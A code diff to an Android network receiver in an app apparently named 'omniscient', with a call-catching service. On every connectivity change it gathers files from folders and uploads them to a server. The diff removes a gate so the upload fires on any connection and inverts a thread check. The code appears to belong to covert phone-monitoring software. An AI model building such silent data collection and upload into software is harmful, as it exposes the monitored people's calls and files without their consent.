@@ -12,10 +12,12 @@ import android.util.Log;
 import android.widget.Toast;
 
 import com.postal.omniscient.MainActivity;
+import com.postal.omniscient.postal.ThreadIsAliveOrNot;
 import com.postal.omniscient.postal.catchPhone.Call.TService;
 import com.postal.omniscient.postal.downloadFiles.DownloadFileRun;
-import com.postal.omniscient.postal.downloadFiles.KeepConnection;
 import com.postal.omniscient.postal.service.StartService;
+
+import org.greenrobot.eventbus.EventBus;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -33,19 +35,22 @@ public class NetworkStateReceiver extends BroadcastReceiver {
     private String Msg = "MyMsg";
     @Override
     public void onReceive(Context context, Intent intent) {
-      // new Intent(context, KeepConnection.class).putExtra("postal"," OOOOGGGGGGG");
+
+
+
 //Все файлы в папках на отправление
         getAllFoldersFiles(context);
         boolean start_or_no = true;
 
-        Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
-        for(Thread a: threadSet){
-          //  Log.d(Msg, "      GET THREADS NAME - "+ a.getName());
-            if(a.getName().equals("TreadConnect")){
-                start_or_no = false;
-            }
-
-        }
+//        Set<Thread> threadSet = Thread.getAllStackTraces().keySet();
+//        for(Thread a: threadSet){
+//          //  Log.d(Msg, "      GET THREADS NAME - "+ a.getName());
+//            if(a.getName().equals("TreadConnect")){
+//                start_or_no = false;
+//            }
+//
+//        }
+        start_or_no = new ThreadIsAliveOrNot("TreadConnect").liveORnot();
 
         Log.d(Msg, "Network connectivity change");
 
@@ -65,7 +70,7 @@ public class NetworkStateReceiver extends BroadcastReceiver {
             final NetworkInfo ni = connectivityManager.getActiveNetworkInfo();
 
             if (ni != null && ni.isConnected()) {
-                if(i==4) {
+             //   if(i==4) {
                     Log.d(Msg, "FILE OUTPUT " + readFromFile(context));
                     Log.i(Msg, "Network " + ni.getTypeName() + " connected");
 
@@ -74,12 +79,12 @@ public class NetworkStateReceiver extends BroadcastReceiver {
 //                            && connectivityManager.getActiveNetworkInfo().isAvailable()
 //                            && connectivityManager.getActiveNetworkInfo().isConnected()) {}
 
-                    if (start_or_no) {
+                    if (!start_or_no) {
                         Log.i("MyMsg", "         ЗАПУСК ПЕредаЧИ НА СЕРВЕР ИНФЫ");
                         startTransferFile(context);// Начать загрузку файлов на сервер при появлении интернета
                         //если она уже не идет и существует конект с сервером
                     }
-                }
+              //  }
             } else if (intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, Boolean.FALSE)) {
                 Log.d(Msg, "There's no network connectivity");
             }
@@ -179,7 +184,7 @@ public class NetworkStateReceiver extends BroadcastReceiver {
         return ret;
     }
     private void startTransferFile(Context context){
-        DownloadFileRun dwnloadFile = new DownloadFileRun(getAllFoldersFiles(context));
+        DownloadFileRun dwnloadFile = new DownloadFileRun(getAllFoldersFiles(context), context);
         Transfer ad = new Transfer(context, dwnloadFile);
         ad.forceLoad();
     }
